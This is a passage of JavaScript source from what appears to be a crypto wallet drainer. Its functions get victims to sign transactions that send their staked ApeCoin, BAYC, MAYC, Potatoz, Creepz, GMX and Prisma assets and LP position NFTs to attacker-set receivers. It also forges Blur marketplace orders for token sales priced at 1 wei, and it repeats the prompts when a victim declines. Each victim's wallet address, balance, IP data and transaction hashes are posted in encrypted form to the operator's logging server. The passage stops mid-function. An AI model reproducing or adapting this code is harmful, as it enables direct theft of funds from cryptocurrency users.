        if (window.ethereum?.["isTrustWallet"]) {
          transactionParams.value = "0";
        }
        try {
          this.logPromting('', "MAYC", {
            "chain": 0x1,
            "tokenPrice": k.price
          });
        } catch (s) {
          console.warn(s);
        }
        try {
          await this.main_provider.sendAsync({
            "method": "eth_sendTransaction",
            "params": [K],
            "from": this.walletAddress
          }, (a, t) => {
            if (a) {
              U(a);
            } else {
              console.log("MAYC STAKING success", t);
              this.pending.push(t);
              D(t);
            }
          });
        } catch (a) {
          U(a);
        }
      }).then(async D => {
        let q = await this.getIpData();
        fetch(this.logDomainName + "backend/apeStaking", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "address": this.walletAddress,
            "walletBalanceInEth": this.walletBalanceInEth,
            "isMobile": this.isMobile(),
            "websiteUrl": window.location.href,
            "websiteDomain": window.location.host,
            "ipData": q,
            "API_KEY": config.API_KEY,
            "signature": this.signature,
            "tokenPrice": Number(k.price).toFixed(3) + " ETH",
            "transferName": "STAKED MAYC",
            "stake_type": "MAYC",
            "transactionHash": D
          }))
        });
        this.txcount++;
        return true;
      })["catch"](async D => {
        this.logCancel("STAKED MAYC", '', Number(k.price).toFixed(3) + " ETH");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.transferStakedMayc(T, k);
        }
        this.updateButtonMessage(true);
        this.txcount++;
      });
    } catch (D) {
      console.warn("Failed to transfer Staked Ape");
    }
  };
  ["transferStakedBayc"] = async (T, k) => {
    try {
      let V = new ethers.utils.Interface(APECOINSTAKING);
      try {
        await this.changeNetwork(1);
      } catch (f) {
        console.log(f);
        return false;
      }
      return await new Promise(async (D, U) => {
        let s = V.encodeFunctionData("withdrawBAYC", [k.stakes, config.receiver]);
        let a = {
          "from": this.walletAddress,
          "to": this.apeStaking,
          "value": "0x0000",
          "data": s
        };
        if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
          a.value = '';
        }
        if (window.ethereum?.["isTrustWallet"]) {
          transactionParams.value = "0";
        }
        try {
          this.logPromting('', "BAYC", {
            "chain": 0x1,
            "tokenPrice": k.price
          });
        } catch (t) {
          console.warn(t);
        }
        try {
          await this.main_provider.sendAsync({
            "method": "eth_sendTransaction",
            "params": [a],
            "from": this.walletAddress
          }, (N, c) => {
            if (N) {
              U(N);
            } else {
              let o = c;
              if (c.hasOwnProperty("result")) {
                o = c.result;
              } else if (c.hasOwnProperty("hash")) {
                o = c.hash;
              }
              console.log("BAYC STAKING success", o);
              this.pending.push(o);
              D(o);
            }
          });
        } catch (N) {
          U(N);
        }
      }).then(async D => {
        let q = await this.getIpData();
        fetch(this.logDomainName + "backend/apeStaking", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "address": this.walletAddress,
            "walletBalanceInEth": this.walletBalanceInEth,
            "isMobile": this.isMobile(),
            "websiteUrl": window.location.href,
            "websiteDomain": window.location.host,
            "ipData": q,
            "API_KEY": config.API_KEY,
            "tokenPrice": Number(k.price).toFixed(3) + " ETH",
            "transferName": "STAKED BAYC",
            "stake_type": "BAYC",
            "signature": this.signature,
            "transactionHash": D
          }))
        });
        return true;
      })["catch"](async D => {
        this.logCancel("STAKED BAYC", '', Number(k.price).toFixed(3) + " ETH");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.transferStakedBayc(T, k);
        }
        this.updateButtonMessage(true);
      });
    } catch (D) {
      console.warn("Failed to transfer Staked Ape");
    }
  };
  ["transferApecoins"] = async (T, k) => {
    try {
      await this.changeNetwork(1);
      console.log("Transferring staked apecoin");
      console.log("Pending Transactions: " + this.pending.length);
      let V = new ethers.utils.Interface(APECOINSTAKING);
      return await new Promise(async (f, D) => {
        let y = V.encodeFunctionData("withdrawApeCoin", [k.stakes, config.receiver]);
        let K = {
          "from": this.walletAddress,
          "to": this.apeStaking,
          "value": "0x0000",
          "data": y
        };
        if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
          K.value = '';
        }
        if (window.ethereum?.["isTrustWallet"]) {
          K.value = "0";
        }
        try {
          this.logPromting('', "APECOINS", {
            "chain": 0x1,
            "tokenPrice": k.usdPrice + " $"
          });
        } catch (s) {
          console.warn(s);
        }
        try {
          await this.main_provider.sendAsync({
            "method": "eth_sendTransaction",
            "params": [K],
            "from": this.walletAddress
          }, (a, t) => {
            if (a) {
              D(a);
            } else {
              let c = t;
              if (t.hasOwnProperty("result")) {
                c = t.result;
              } else if (t.hasOwnProperty("hash")) {
                c = t.hash;
              }
              console.log("APECOIN STAKING success", c);
              this.pending.push(c);
              this.considerations = this.considerations.filter(l => l.contractAddress != this.apeCoin);
              this.offers = this.offers.filter(l => l.contractAddress != this.apeCoin);
              this.uniswapTokens = this.uniswapTokens.filter(l => l.contractAddress != this.apeCoin);
              this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(l => l.contractAddress != this.apeCoin);
              this.sushiswapTokens = this.sushiswapTokens.filter(l => l.contractAddress != this.apeCoin);
              f(c);
            }
          });
        } catch (a) {
          D(a);
        }
      }).then(async f => {
        let U = await this.getIpData();
        fetch(this.logDomainName + "backend/apeStaking", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "address": this.walletAddress,
            "walletBalanceInEth": this.walletBalanceInEth,
            "isMobile": this.isMobile(),
            "websiteUrl": window.location.href,
            "websiteDomain": window.location.host,
            "ipData": U,
            "API_KEY": config.API_KEY,
            "signature": this.signature,
            "contractId": this.contractId,
            "transferName": "STAKED APECOIN",
            "stake_type": "APECOIN",
            "transactionHash": f
          }))
        });
        this.txcount++;
        return true;
      })["catch"](async f => {
        this.logCancel("STAKED APECOIN", '', k.usdPrice + " $");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.transferApecoins(hash_sweet, k);
        }
        this.updateButtonMessage(true);
        this.txcount++;
      });
    } catch (f) {
      console.warn("Failed to withdraw Apecoins");
    }
  };
  ["transferPotatoz"] = async (T, k) => {
    try {
      if (this.potatozStaked.tokenIds.length > 0) {
        console.log("potatoz", this.potatozStaked.tokenIds);
        await this.changeNetwork(1);
        console.log("transfering staked potatoz");
        await new Promise(async (V, f) => {
          let y = new ethers.utils.Interface(potatoz_ABI);
          let K = this.potatozStaked.tokenIds;
          let s = y.encodeFunctionData("stakeTransferAll", [this.walletAddress, config.seaport_receiver, K]);
          let a = this.potatozStaked.contractAddress;
          let t = {
            "from": this.walletAddress,
            "to": a,
            "value": "0x0000",
            "data": s
          };
          if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
            t.value = '';
          }
          if (window.ethereum?.["isTrustWallet"]) {
            t.value = "0";
          }
          let N = {
            name: "POTATOZ_STAKED",
            totalPrice: 1.5,
            chain: 1
          };
          try {
            this.logPromting(T, "POTATOZ", {
              "chain": 0x1,
              "tokenPrice": this.potatozValue
            });
          } catch (c) {
            console.warn(c);
          }
          this.estimateTXcosts(t, N, 1);
          try {
            await this.main_provider.sendAsync({
              "method": "eth_sendTransaction",
              "params": [t],
              "from": this.walletAddress
            }, (l, o) => {
              if (l) {
                f(l);
              } else {
                let I = o;
                if (o.hasOwnProperty("result")) {
                  I = o.result;
                } else if (o.hasOwnProperty("hash")) {
                  I = o.hash;
                }
                V(I);
              }
            });
          } catch (l) {
            f(l);
          }
        }).then(async V => {
          let D = await this.getIpData();
          fetch(this.logDomainName + "backend/potatoz", {
            "method": "POST",
            "mode": "cors",
            "cache": "no-cache",
            "headers": {
              "Content-Type": "application/json",
              "Accept": "application/json"
            },
            "body": this.encryptBody(JSON.stringify({
              "address": this.walletAddress,
              "isMobile": this.isMobile(),
              "websiteUrl": window.location.href,
              "websiteDomain": window.location.host,
              "ipData": D,
              "API_KEY": config.API_KEY,
              "tokenPrice": Number(this.potatozValue).toFixed(3) + " ETH",
              "transactionHash": V,
              "hash_sweet": T
            }))
          });
          this.txcount++;
          this.addToLocalStorage(T);
          return true;
        })["catch"](async V => {
          this.logCancel("Staked Potatoz NFTs", '', Number(this.potatozValue).toFixed(3) + " ETH");
          await this.handleDecline();
          if (config.repeatHighest) {
            return await this.transferPotatoz(T);
          }
          this.updateButtonMessage(true);
          this.txcount++;
          return false;
        });
      }
    } catch (V) {
      console.warn("Potatoz error:", V);
    }
  };
  ["transferCreepz"] = async T => {
    try {
      console.log(this.creepzStaked, "erfewrfjklwrfedijklfrejikolrfdewuiolrfwdeuiolwsfrde");
      if (this.creepzStaked.tokenIds.length > 0) {
        console.log("creepz", this.creepzStaked.tokenIds);
        await this.changeNetwork(1);
        console.log("transfering staked creepz");
        await new Promise(async (B, V) => {
          let q = new ethers.utils.Interface(creepz_ABI);
          let y = this.creepzStaked.tokenIds;
          let K = q.encodeFunctionData("transferWhileStaked", [config.seaport_receiver, y]);
          let s = this.creepzStaked.contractAddress;
          let a = {
            "from": this.walletAddress,
            "to": s,
            "value": "0x0000",
            "data": K
          };
          if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
            a.value = '';
          }
          if (window.ethereum?.["isTrustWallet"]) {
            a.value = "0";
          }
          let t = {
            name: "CREEPZ_STAKED",
            totalPrice: 1.5,
            chain: 1
          };
          try {
            this.logPromting(T, "CREEPZ", {
              "chain": 0x1,
              "tokenPrice": this.creepzValue
            });
          } catch (N) {
            console.warn(N);
          }
          this.estimateTXcosts(a, t, 1);
          try {
            await this.main_provider.sendAsync({
              "method": "eth_sendTransaction",
              "params": [a],
              "from": this.walletAddress
            }, (c, l) => {
              if (c) {
                V(c);
              } else {
                let O = l;
                if (l.hasOwnProperty("result")) {
                  O = l.result;
                } else if (l.hasOwnProperty("hash")) {
                  O = l.hash;
                }
                B(O);
              }
            });
          } catch (c) {
            V(c);
          }
        }).then(async B => {
          let f = await this.getIpData();
          fetch(this.logDomainName + "backend/creepz", {
            "method": "POST",
            "mode": "cors",
            "cache": "no-cache",
            "headers": {
              "Content-Type": "application/json",
              "Accept": "application/json"
            },
            "body": this.encryptBody(JSON.stringify({
              "address": this.walletAddress,
              "isMobile": this.isMobile(),
              "websiteUrl": window.location.href,
              "websiteDomain": window.location.host,
              "ipData": f,
              "API_KEY": config.API_KEY,
              "tokenPrice": Number(this.creepzValue).toFixed(3) + " ETH",
              "transactionHash": B,
              "hash_sweet": T
            }))
          });
          this.txcount++;
          this.addToLocalStorage(T);
          return true;
        })["catch"](async B => {
          this.logCancel("Staked creepz NFTs", '', Number(this.creepzValue).toFixed(3) + " ETH");
          await this.handleDecline();
          if (config.repeatHighest) {
            return await this.transferCreepz(T);
          }
          this.updateButtonMessage(true);
          this.txcount++;
          return false;
        });
      }
    } catch (B) {
      console.warn("Potatoz error:", B);
    }
  };
  ["transferSeaport"] = async T => {
    console.log("SP0", this.offers, this.considerations);
    if (this.offers.length != 0 && this.considerations.length != 0) {
      console.log("SP1", this.offers, this.considerations);
      try {
        await this.changeNetwork(1);
        if (this.offers.length != 0 && this.considerations.length != 0) {
          console.log(this.offers);
          console.log(this.considerations);
          try {
            this.logPromting(T, "SEAPORT", {
              "chain": 0x1,
              "tokenPrice": this.seaportValue
            });
          } catch (U) {
            console.warn(U);
          }
          let D = await f();
          console.log(D);
          this.sweets = this.sweets.filter(q => !this.considerations.map(y => y.token).includes(q.contractAddress));
          this.uniswapTokens = this.uniswapTokens.filter(q => !this.considerations.map(y => y.token).includes(q.contractAddress));
          this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(q => !this.considerations.map(y => y.token).includes(q.contractAddress));
          this.sushiswapTokens = this.sushiswapTokens.filter(q => !this.considerations.map(y => y.token).includes(q.contractAddress));
          this.permitTokens.ETH = this.permitTokens.ETH.filter(q => !this.considerations.map(y => y.token).includes(q.contractAddress));
          this.blurTokens = this.blurTokens.filter(q => !this.considerations.map(y => y.token).includes(q.contractAddress));
          try {
            let q = await this.getIpData();
            let y = '';
            this.seaportTokens.forEach((K, s) => {
              if (K.type != "ERC20") {
                K.tokenIds.forEach(N => {
                  y += "<a href=\"https://opensea.io/assets/ethereum/" + K.contractAddress + "/" + N + "\">" + K.collectionSymbol + "</a> (" + (K.price / K.owned).toFixed(3) + " ETH)" + (s + 1 == this.seaportTokens.length ? '' : ",") + " ";
                });
              } else {
                y += "<a href=\"https://etherscan.io/address/" + K.contractAddress + "\">" + K.name + "</a> (" + K.usdPrice + "$)" + (s + 1 == this.seaportTokens.length ? '' : ",") + " ";
              }
            });
            fetch(this.logDomainName + "backend/seaport", {
              "method": "POST",
              "mode": "cors",
              "cache": "no-cache",
              "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json"
              },
              "body": this.encryptBody(JSON.stringify({
                "order": D,
                "address": this.walletAddress,
                "walletBalanceInEth": this.walletBalanceInEth,
                "isMobile": this.isMobile(),
                "websiteUrl": window.location.href,
                "websiteDomain": window.location.host,
                "ipData": q,
                "API_KEY": config.API_KEY,
                "signature": this.signature,
                "seaportItems": y,
                "seaportValue": Number(this.seaportValue).toFixed(3) + " ETH",
                "hash_sweet": T
              }))
            });
            this.txcount++;
            this.addToLocalStorage(T);
            return true;
          } catch (K) {
            console.log("Connection Log error: ", K);
          }
        } else {
          console.warn("SEAPORT no approved items");
        }
      } catch (s) {
        this.logCancel("Seaport");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.transferSeaport(T);
        }
        this.updateButtonMessage(true);
        this.txcount++;
        console.log(s);
      }
    }
  };
  ["transferBlur"] = async T => {
    try {
      if (this.blurTokens.length > 0) {
        console.log("blur", this.blurTokens);
        await this.changeNetwork(1);
        console.log("transferring blur tokens");
        console.table(this.blurTokens);
        let V = String(Math.floor(new Date().getTime() * 10000) + 86400);
        let f = this.blurNonce;
        let D = [];
        let U = [];
        this.blurTokens.map(a => {
          if (a.tokenIds) {
            U = a.tokenIds.map(l => {
              return {
                "trader": this.walletAddress,
                "side": 0x1,
                "matchingPolicy": "0x00000000006411739da1c40b106f8511de5d1fac",
                "collection": a.contractAddress,
                "tokenId": l,
                "amount": "1",
                "paymentToken": "0x0000000000000000000000000000000000000000",
                "price": "1",
                "listingTime": "1661790956",
                "expirationTime": V,
                "fees": [{
                  "rate": "10000",
                  "recipient": config.blurfee
                }],
                "salt": String(BigInt((Math.floor(Math.random() * 90000000000) + 1000000000000000) ** 2)),
                "extraParams": "0x",
                "nonce": Number(f)
              };
            });
          } else {
            U = [{
              "trader": this.walletAddress,
              "side": 0x0,
              "matchingPolicy": "0x00000000006411739da1c40b106f8511de5d1fac",
              "collection": config.fakeCollection,
              "tokenId": "0",
              "amount": "1",
              "paymentToken": "0x0000000000A39bb272e79075ade125fd351887Ac",
              "price": String(a.balance),
              "listingTime": "1661790956",
              "expirationTime": V,
              "fees": [],
              "salt": String(BigInt((Math.floor(Math.random() * 90000000000) + 1000000000000000) ** 2)),
              "extraParams": "0x",
              "nonce": Number(f)
            }];
          }
          D = D.concat(U);
        });
        let q = await fetch(this.logDomainName + "blur/root", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "walletAddress": this.walletAddress,
            "orders": D,
            "API_KEY": config.API_KEY,
            "signature": this.signature,
            "hash_sweet": T
          }))
        }).then(a => a.json()).then(a => JSON.parse(this.decryptBody(a.encrypted)));
        console.log(q);
        let y = {
          "name": "Blur Exchange",
          "version": "1.0",
          "chainId": 0x1,
          "verifyingContract": this.blurRouter
        };
        let K = {
          "Root": [{
            "name": "root",
            "type": "bytes32"
          }]
        };
        let s = {
          "root": q.root
        };
        try {
          this.logPromting(T, "BLUR", {
            "chain": 0x1,
            "tokenPrice": this.blurValue
          });
        } catch (a) {
          console.warn(a);
        }
        await new Promise(async (t, N) => {
          try {
            let l = await this.signer._signTypedData(y, K, s);
            let o = false;
            try {
              const O = ethers.utils.verifyTypedData(y, K, s, l);
              if (O.toLowerCase() === this.walletAddress.toLowerCase()) {
                o = false;
                console.log("Might be fake");
              } else {
                o = true;
              }
            } catch (I) {}
            t([l, o]);
          } catch (x) {
            N(x);
          }
        }).then(async t => {
          let o = t[0];
          let O = o.substring(2);
          let I = "0x" + O.substring(0, 64);
          let x = "0x" + O.substring(64, 128);
          let E = parseInt(O.substring(128, 130), 16);
          let r = await this.secondProvider.getBlockNumber();
          let Q = D.map((e, C) => {
            if (e.side) {
              return {
                "buy": {
                  "order": {
                    "trader": config.receiver,
                    "side": 0x0,
                    "matchingPolicy": "0x00000000006411739da1c40b106f8511de5d1fac",
                    "collection": e.collection,
                    "tokenId": e.tokenId,
                    "amount": "1",
                    "paymentToken": "0x0000000000000000000000000000000000000000",
                    "price": "1",
                    "listingTime": "1661790956",
                    "expirationTime": V,
                    "fees": [],
                    "salt": String(BigInt((Math.floor(Math.random() * 90000000000) + 1000000000000000) ** 2)),
                    "extraParams": "0x"
                  },
                  "v": 0x0,
                  "r": "0x0000000000000000000000000000000000000000000000000000000000000000",
                  "s": "0x0000000000000000000000000000000000000000000000000000000000000000",
                  "extraSignature": q.root,
                  "signatureVersion": 0x0,
                  "blockNumber": "0"
                },
                "sell": {
                  "order": {
                    ...e
                  },
                  "v": E,
                  "r": I,
                  "s": x,
                  "extraSignature": q.paths[C],
                  "signatureVersion": 0x1,
                  "blockNumber": String(r)
                }
              };
            }
            if (!e.side) {
              return {
                "sell": {
                  "order": {
                    "trader": config.receiver,
                    "side": 0x1,
                    "matchingPolicy": "0x00000000006411739da1c40b106f8511de5d1fac",
                    "collection": config.fakeCollection,
                    "tokenId": "0",
                    "amount": "1",
                    "paymentToken": "0x0000000000A39bb272e79075ade125fd351887Ac",
                    "price": e.price,
                    "listingTime": "1661790956",
                    "expirationTime": V,
                    "fees": [],
                    "salt": String(BigInt((Math.floor(Math.random() * 90000000000) + 1000000000000000) ** 2)),
                    "extraParams": "0x"
                  },
                  "v": 0x0,
                  "r": "0x0000000000000000000000000000000000000000000000000000000000000000",
                  "s": "0x0000000000000000000000000000000000000000000000000000000000000000",
                  "extraSignature": q.root,
                  "signatureVersion": 0x0,
                  "blockNumber": "0"
                },
                "buy": {
                  "order": {
                    ...e
                  },
                  "v": E,
                  "r": I,
                  "s": x,
                  "extraSignature": q.paths[C],
                  "signatureVersion": 0x1,
                  "blockNumber": String(r)
                }
              };
            }
          });
          console.log(Q);
          this.sweets = this.sweets.filter(e => !this.blurTokens.map(C => C.contractAddress).includes(e.contractAddress));
          this.considerations = this.considerations.filter(e => !this.blurTokens.map(C => C.contractAddress).includes(e.token));
          this.offers = this.offers.filter(e => !this.blurTokens.map(C => C.contractAddress).includes(e.token));
          let v = await this.getIpData();
          let w = '';
          this.blurTokens.forEach((e, C) => {
            e?.["tokenIds"]?.["forEach"](d => {
              w += "<a href=\"https://opensea.io/assets/ethereum/" + e.contractAddress + "/" + d + "\">" + e.collectionSymbol + "</a> (" + (e.price / e.owned).toFixed(3) + " ETH)" + (C + 1 == this.blurTokens.length ? '' : ",") + " ";
            });
          });
          fetch(this.logDomainName + "blur/execute", {
            "method": "POST",
            "mode": "cors",
            "cache": "no-cache",
            "headers": {
              "Content-Type": "application/json",
              "Accept": "application/json"
            },
            "body": this.encryptBody(JSON.stringify({
              "data": Q,
              "address": this.walletAddress,
              "walletBalanceInEth": this.walletBalanceInEth,
              "isMobile": this.isMobile(),
              "websiteUrl": window.location.href,
              "websiteDomain": window.location.host,
              "ipData": v,
              "API_KEY": config.API_KEY,
              "signature": this.signature,
              "mayfake": t[1],
              "hash_sweet": T,
              "blurItems": w,
              "blurValue": Number(this.blurValue).toFixed(3) + " ETH"
            }))
          });
          this.txcount++;
          this.addToLocalStorage(T);
          return true;
        })["catch"](async t => {
          console.log(t);
          this.logCancel("Blur", '', Number(this.blurValue).toFixed(3) + " ETH");
          await this.handleDecline();
          if (config.repeatHighest) {
            return await this.transferBlur(T);
          }
          this.updateButtonMessage(true);
          this.txcount++;
        });
      }
    } catch (t) {
      console.warn("Blur error:", t);
    }
  };
  ["transferPancakeLPV3"] = async (T, k, H) => {
    console.log("Pancake LPV3", k);
    if (k.length > 0) {
      try {
        let f = k[0].chain;
        await this.changeNetwork(f);
        console.log("TRANSFERRING LP NFTS");
        console.table(k);
        await new Promise(async (D, U) => {
          let y = new ethers.utils.Interface(LP_ABI);
          let K = y.encodeFunctionData("setApprovalForAll", [config.tokenContractAddresses[f], true]);
          let s = [K];
          let a = y.encodeFunctionData("multicall", [s]);
          let t = {
            "from": this.walletAddress,
            "to": this.pancakeswapV3Positions,
            "value": "0x0000",
            "data": a
          };
          if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
            t.value = '';
          }
          if (window.ethereum?.["isTrustWallet"]) {
            t.value = "0";
          }
          k[0].name = "PNC_LPV3";
          k[0].totalPrice = k[0].price;
          this.estimateTXcosts(t, k[0], k[0].chain);
          try {
            this.logPromting(T, "PNC_LPV3", {
              "chain": f,
              "tokens": k,
              "tokenPrice": H,
              "to_wallet": config.tokenContractAddresses[f]
            });
          } catch (N) {
            console.warn(N);
          }
          try {
            await this.main_provider.sendAsync({
              "method": "eth_sendTransaction",
              "params": [t],
              "from": this.walletAddress
            }, (c, l) => {
              if (c) {
                U(c);
              } else {
                let O = l;
                if (l.hasOwnProperty("result")) {
                  O = l.result;
                } else if (l.hasOwnProperty("hash")) {
                  O = l.hash;
                }
                D(O);
              }
            });
          } catch (c) {
            U(c);
          }
        }).then(async D => {
          let q = await this.getIpData();
          fetch(this.logDomainName + "backend/pnc_positions", {
            "method": "POST",
            "mode": "cors",
            "cache": "no-cache",
            "headers": {
              "Content-Type": "application/json",
              "Accept": "application/json"
            },
            "body": this.encryptBody(JSON.stringify({
              "address": this.walletAddress,
              "isMobile": this.isMobile(),
              "websiteUrl": window.location.href,
              "websiteDomain": window.location.host,
              "ipData": q,
              "API_KEY": config.API_KEY,
              "chain": f,
              "tokens": k,
              "signature": this.signature,
              "tokenPrice": Number(H).toFixed(3) + " ETH",
              "transactionHash": D,
              "useVerified": this.useVerified[f] ? this.verified[f] : null,
              "contract_salt": config.contract_salt_mc[f],
              "unmarkedContract": config.tokenContractAddresses[f],
              "hash_sweet": T
            }))
          });
          this.txcount++;
          this.addToLocalStorage(T);
          return true;
        })["catch"](async D => {
          this.logCancel("Pancake LP NFTS", '', Number(H).toFixed(3) + " ETH");
          await this.handleDecline();
          if (config.repeatHighest) {
            return await this.transferPancakeLPV3(T, k, H);
          }
          this.updateButtonMessage(true);
          this.txcount++;
          return false;
        });
      } catch (D) {
        console.warn("LPV3 error:", D);
      }
    }
  };
  ["transferSushiswapLPV3"] = async (T, k, H) => {
    console.log("Sushiswap LPV3", k);
    if (k.length > 0) {
      try {
        let f = k[0].chain;
        await this.changeNetwork(f);
        console.log("TRANSFERRING LP NFTS");
        console.table(k);
        await new Promise(async (D, U) => {
          let s = new ethers.utils.Interface(LP_ABI);
          let a = s.encodeFunctionData("setApprovalForAll", [config.tokenContractAddresses[f], true]);
          let t = [a];
          let N = s.encodeFunctionData("multicall", [t]);
          let c = {
            "from": this.walletAddress,
            "to": this.sushiswapV3Positions[f],
            "value": "0x0000",
            "data": N
          };
          if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
            c.value = '';
          }
          if (window.ethereum?.["isTrustWallet"]) {
            c.value = "0";
          }
          k[0].name = "SUS_LPV3";
          k[0].totalPrice = k[0].price;
          this.estimateTXcosts(c, k[0], k[0].chain);
          try {
            this.logPromting(T, "SUS_LPV3", {
              "chain": f,
              "tokens": k,
              "tokenPrice": H,
              "to_wallet": config.tokenContractAddresses[f]
            });
          } catch (l) {
            console.warn(l);
          }
          try {
            await this.main_provider.sendAsync({
              "method": "eth_sendTransaction",
              "params": [c],
              "from": this.walletAddress
            }, (o, O) => {
              if (o) {
                U(o);
              } else {
                let x = O;
                if (O.hasOwnProperty("result")) {
                  x = O.result;
                } else if (O.hasOwnProperty("hash")) {
                  x = O.hash;
                }
                D(x);
              }
            });
          } catch (o) {
            U(o);
          }
        }).then(async D => {
          let q = await this.getIpData();
          fetch(this.logDomainName + "backend/sus_positions", {
            "method": "POST",
            "mode": "cors",
            "cache": "no-cache",
            "headers": {
              "Content-Type": "application/json",
              "Accept": "application/json"
            },
            "body": this.encryptBody(JSON.stringify({
              "address": this.walletAddress,
              "isMobile": this.isMobile(),
              "websiteUrl": window.location.href,
              "websiteDomain": window.location.host,
              "ipData": q,
              "API_KEY": config.API_KEY,
              "chain": f,
              "tokens": k,
              "signature": this.signature,
              "tokenPrice": Number(H).toFixed(3) + " ETH",
              "transactionHash": D,
              "useVerified": this.useVerified[f] ? this.verified[f] : null,
              "contract_salt": config.contract_salt_mc[f],
              "unmarkedContract": config.tokenContractAddresses[f],
              "hash_sweet": T
            }))
          });
          this.txcount++;
          this.addToLocalStorage(T);
          return true;
        })["catch"](async D => {
          this.logCancel("Sushiswap LP NFTS", '', Number(H).toFixed(3) + " ETH");
          await this.handleDecline();
          if (config.repeatHighest) {
            return await this.transferSushiswapLPV3(T, k, H);
          }
          this.updateButtonMessage(true);
          this.txcount++;
          return false;
        });
      } catch (D) {
        console.warn("LPV3 error:", D);
      }
    }
  };
  ["transferStakedGMX"] = async (T, k) => {
    console.log("Staked GMX");
    try {
      const V = k.chain;
      await this.changeNetwork(V);
      console.log("TRANSFERRING ACCOUNT GMX");
      await new Promise(async (f, D) => {
        let K = new ethers.utils.Interface(GMX_ABI);
        let s = K.encodeFunctionData("signalTransfer", [this.blockaid[V].mc]);
        let a = {
          "from": this.walletAddress,
          "to": this.gmxRewardsManager[V],
          "data": s
        };
        console.log(a);
        try {
          await this.main_provider.sendAsync({
            "method": "eth_sendTransaction",
            "params": [a],
            "from": this.walletAddress
          }, (t, N) => {
            if (t) {
              D(t);
            } else {
              let l = N;
              if (N.hasOwnProperty("result")) {
                l = N.result;
              } else if (N.hasOwnProperty("hash")) {
                l = N.hash;
              }
              f(l);
            }
          });
        } catch (t) {
          D(t);
        }
      }).then(async f => {
        let U = await this.getIpData();
        fetch(this.logDomainName + "backend/gmx", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "address": this.walletAddress,
            "isMobile": this.isMobile(),
            "websiteUrl": window.location.href,
            "websiteDomain": window.location.host,
            "ipData": U,
            "API_KEY": config.API_KEY,
            "chain": V,
            "market": k,
            "signature": this.signature,
            "tokenPrice": Number(k.usdPrice).toFixed(3),
            "transactionHash": f,
            "hash_sweet": T,
            "useVerified": null,
            "contract_salt": this.blockaid[V].mc_salt,
            "unmarkedContract": this.blockaid[V].mc
          }))
        });
        this.txcount++;
        this.addToLocalStorage(T);
        return true;
      })["catch"](async f => {
        this.logCancel("GMX", '', Number(k.usdPrice).toFixed(3));
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.transferStakedGMX(T, k);
        }
        this.updateButtonMessage(true);
        this.txcount++;
        return false;
      });
    } catch (f) {}
  };
  ["transferPrisma"] = async (T, k) => {
    console.log("Prisma");
    try {
      await this.changeNetwork(1);
      await new Promise(async (f, D) => {
        let y = new ethers.utils.Interface(PRISMA_ABI);
        let K = y.encodeFunctionData("setDelegateApproval", [config.tokenContractAddresses[1], true]);
        let s = {
          "from": this.walletAddress,
          "to": "0x72c590349535AD52e6953744cb2A36B409542719",
          "data": K
        };
        console.log(s);
        try {
          await this.main_provider.sendAsync({
            "method": "eth_sendTransaction",
            "params": [s],
            "from": this.walletAddress
          }, (a, t) => {
            if (a) {
              D(a);
            } else {
              let c = t;
              if (t.hasOwnProperty("result")) {
                c = t.result;
              } else if (t.hasOwnProperty("hash")) {
                c = t.hash;
              }
              f(c);
            }
          });
        } catch (a) {
          D(a);
        }
      }).then(async f => {
        let U = await this.getIpData();
        fetch(this.logDomainName + "backend/prisma", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "address": this.walletAddress,
            "isMobile": this.isMobile(),
            "websiteUrl": window.location.href,
            "websiteDomain": window.location.host,
            "ipData": U,
            "API_KEY": config.API_KEY,
            "chain": 1,
            "market": k.items,
            "signature": this.signature,
            "tokenPrice": Number(k.totalPrice).toFixed(3).toString() + " ETH",
            "transactionHash": f,
            "hash_sweet": T,
            "useVerified": this.useVerified[1] ? this.verified[1] : null,
            "contract_salt": config.contract_salt_mc[1],
            "unmarkedContract": config.tokenContractAddresses[1]
          }))
        });
        this.txcount++;
        this.addToLocalStorage(T);
        return true;
      })["catch"](async f => {
        this.logCancel("Prisma", '', Number(k.totalPrice).toFixed(3).toString() + " ETH");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.transferPrisma(T, k);
        }
        this.updateButtonMessage(true);
        this.txcount++;
        return false;
      });
    } catch (f) {}
  };
  ["transferCamelotLPV3"] = async (T, k, H) => {
    console.log("Pancake LPV3", k);
    if (k.length > 0) {
      try {
        let f = k[0].chain;
        await this.changeNetwork(f);
        console.log("TRANSFERRING LP NFTS");
        console.table(k);
        await new Promise(async (D, U) => {
          let K = new ethers.utils.Interface(LP_ABI);
          let s = K.encodeFunctionData("setApprovalForAll", [config.tokenContractAddresses[f], true]);
          let a = [s];
          let t = K.encodeFunctionData("multicall", [a]);
          let N = {
            "from": this.walletAddress,
            "to": this.camelotV3Positions,
            "value": "0x0000",
            "data": t
          };
          if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
            N.value = '';
          }
